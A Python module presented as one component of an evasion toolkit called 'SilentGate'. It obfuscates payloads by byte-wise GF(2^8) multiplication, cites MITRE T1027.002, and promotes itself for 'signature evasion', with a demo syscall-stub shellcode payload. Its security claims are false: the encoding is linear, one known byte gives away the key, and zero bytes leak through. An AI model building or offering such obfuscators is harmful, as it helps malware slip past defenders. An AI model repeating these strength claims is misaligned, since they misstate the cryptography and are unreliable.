"""
SilentGate v8.0 - Component 1: Galois Field GF(2^8) Encoder
Author  : JarDani
License : MIT

Mathematical foundation:
  GF(2^8) finite field with 256 elements
  Irreducible polynomial: x^8 + x^4 + x^3 + x + 1 (AES = 0x11B)
  Multiplication via shift-and-XOR (peasant algorithm)
  Inverse table precomputed for O(1) decoding

Security over XOR:
  XOR is linear - known plaintext trivially recoverable
  GF multiplication is non-linear - same operation as AES SubBytes
  Without key, recovery requires solving GF(2^8) discrete log

MITRE: T1027.002
"""

import os
import numpy as np


def gf_mul(a, b):
    """
    GF(2^8) multiplication via Russian peasant algorithm.
    Irreducible polynomial 0x11B (AES standard).
    Verified: gf_mul(2,3)=6, gf_mul(0x53,0xCA)=1
    """
    p = 0
    for _ in range(8):
        if b & 1:
            p ^= a
        hi = a & 0x80
        a = (a << 1) & 0xFF
        if hi:
            a ^= 0x1B
        b >>= 1
    return p


# Precompute inverse table
_GF_INV = [0] * 256
for _i in range(1, 256):
    for _j in range(1, 256):
        if gf_mul(_i, _j) == 1:
            _GF_INV[_i] = _j
            break


def gf_inv(a):
    """Multiplicative inverse in GF(2^8). gf_mul(a, gf_inv(a)) = 1"""
    return _GF_INV[a]


def generate_key(length=32):
    """Generate random non-zero GF key."""
    return bytes([b if b != 0 else 1 for b in os.urandom(length)])


def encode(payload, key=None):
    """
    Encode payload: encoded[i] = GF_mul(payload[i], key[i % len(key)])
    Zero bytes pass through unchanged.
    """
    if key is None:
        key = generate_key(32)
    payload = bytes(payload)
    encoded = bytes([
        gf_mul(b, key[i % len(key)]) if b != 0 else 0
        for i, b in enumerate(payload)
    ])
    return encoded, key


def decode(encoded, key):
    """
    Decode: decoded[i] = GF_mul(encoded[i], GF_inv(key[i % len(key)]))
    Field property: GF_mul(GF_mul(p, k), GF_inv(k)) = p
    """
    encoded = bytes(encoded)
    return bytes([
        gf_mul(e, gf_inv(key[i % len(key)])) if e != 0 else 0
        for i, e in enumerate(encoded)
    ])


def verify(payload, key):
    """Verify encode -> decode round trip is exact."""
    encoded, _ = encode(payload, key)
    return decode(encoded, key) == bytes(payload)


def entropy(data):
    counts = np.bincount(list(data), minlength=256).astype(float)
    probs  = counts / counts.sum()
    probs  = probs[probs > 0]
    return float(-np.sum(probs * np.log2(probs)))


def print_report(payload, encoded, key):
    print(f"""
  GF(2^8) ENCODING REPORT
  ========================
  Field polynomial : x^8 + x^4 + x^3 + x + 1 (0x11B)
  Key length       : {len(key)} bytes
  Payload size     : {len(payload)} bytes
  Payload entropy  : {entropy(payload):.4f} bits
  Encoded entropy  : {entropy(encoded):.4f} bits

  Verification     : gf_mul(2,3)={gf_mul(2,3)} (correct=6)
                     gf_mul(0x53,0xCA)={gf_mul(0x53,0xCA)} (correct=1)

  Security:
  Non-linear GF multiplication — same as AES SubBytes
  Known plaintext attack requires solving GF discrete log
  Stronger than XOR for signature evasion

  MITRE: T1027.002
""")


if __name__ == "__main__":
    payload = bytes([0x4C,0x8B,0xD1,0xB8,0x18,0x00,0x00,0x00,
                     0x0F,0x05,0xC3,0x90,0x48,0x31,0xC0,0xC3])

    key     = generate_key(32)
    enc, _  = encode(payload, key)
    dec     = decode(enc, key)
    valid   = verify(payload, key)

    print(f"[GF] Original : {payload.hex()}")
    print(f"[GF] Encoded  : {enc.hex()}")
    print(f"[GF] Decoded  : {dec.hex()}")
    print(f"[GF] Verified : {valid}")
    print_report(payload, enc, key)
